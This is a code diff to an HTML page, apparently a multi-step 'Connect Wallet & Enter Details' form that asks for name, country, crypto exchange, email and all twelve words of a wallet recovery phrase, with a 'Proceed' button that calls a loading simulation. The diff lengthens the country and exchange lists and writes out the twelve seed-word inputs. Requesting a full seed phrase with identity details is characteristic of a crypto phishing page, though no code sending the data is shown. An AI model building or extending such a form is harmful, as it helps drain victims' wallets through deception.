@@ -55,37 +55,64 @@
     </div>
 
     <!-- STEP 3 -->
-    <div class="step step-3">
-      <h2>Connect Wallet & Enter Details</h2>
-      <input type="text" id="name" placeholder="Name" />
-      <input type="text" id="surname" placeholder="Surname" />
-      <select id="country">
-        <option disabled selected>Select Country</option>
-        <option>Switzerland</option>
-        <option>USA</option>
-        <option>Germany</option>
-        <option>Canada</option>
-        <!-- Add more countries -->
-      </select>
-      <select id="exchange">
-        <option disabled selected>Select Exchange</option>
-        <option>Binance</option>
-        <option>Coinbase</option>
-        <option>Kraken</option>
-        <option>OKX</option>
-      </select>
-      <input type="email" id="email" placeholder="Email" />
-      <div class="mnemonic">
-        <label>Mnemonic Phrase</label>
-        <div class="mnemonic-boxes">
-          ${Array.from({ length: 12 }).map((_, i) =>
-            `<input type="text" placeholder="${i + 1}" />`
-          ).join('')}
-        </div>
-      </div>
-      <button onclick="prevStep()">← Back</button>
-      <button onclick="simulateLoading()">Proceed</button>
+<div class="step step-3">
+  <h2>Connect Wallet & Enter Details</h2>
+  <input type="text" id="name" placeholder="Name" />
+  <input type="text" id="surname" placeholder="Surname" />
+
+  <select id="country">
+    <option disabled selected>Select Country</option>
+    <option>Switzerland</option>
+    <option>USA</option>
+    <option>Germany</option>
+    <option>Canada</option>
+    <option>Denmark</option>
+    <option>New Zealand</option>
+    <option>France</option>
+    <option>Belgium</option>
+    <option>United Kingdom</option>
+    <!-- Add more countries -->
+  </select>
+
+  <select id="exchange">
+    <option disabled selected>Select Exchange</option>
+    <option>Binance</option>
+    <option>Coinbase</option>
+    <option>Kraken</option>
+    <option>Shakepay</option>
+    <option>Newton</option>
+    <option>Paybis</option>
+    <option>Exodus</option>
+    <option>Bitcoin.com</option>
+    <option>OKX</option>
+    <option>Pitpanda</option>
+    <option>Crypto.com</option>
+    <option>Bitget</option>
+  </select>
+
+  <input type="email" id="email" placeholder="Email" />
+
+  <div class="mnemonic">
+    <label>Mnemonic Phrase</label>
+    <div class="mnemonic-boxes">
+      <input type="text" placeholder="1" />
+      <input type="text" placeholder="2" />
+      <input type="text" placeholder="3" />
+      <input type="text" placeholder="4" />
+      <input type="text" placeholder="5" />
+      <input type="text" placeholder="6" />
+      <input type="text" placeholder="7" />
+      <input type="text" placeholder="8" />
+      <input type="text" placeholder="9" />
+      <input type="text" placeholder="10" />
+      <input type="text" placeholder="11" />
+      <input type="text" placeholder="12" />
     </div>
+  </div>
+
+  <button onclick="prevStep()">← Back</button>
+  <button onclick="simulateLoading()">Proceed</button>
+</div>
 
     <!-- STEP 4 -->
     <div class="step step-4">
